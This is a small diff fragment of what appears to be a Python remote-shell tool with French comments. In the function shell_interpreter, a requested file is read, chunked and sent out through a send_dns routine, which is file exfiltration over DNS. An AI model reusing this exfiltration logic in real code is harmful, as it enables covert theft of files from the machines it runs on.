@@ -145,7 +145,7 @@ def shell_interpreter(socket):
                 # ouverture du fichier en lecture seule
                 output = open(cmd[1], 'r')
                 output = output.read()
-
+                # à poursuivre : coller le contenu dans un nouveau fichier
                 # réception et envoi de son contenu
                 output = chunk(output)
                 send_dns(output)
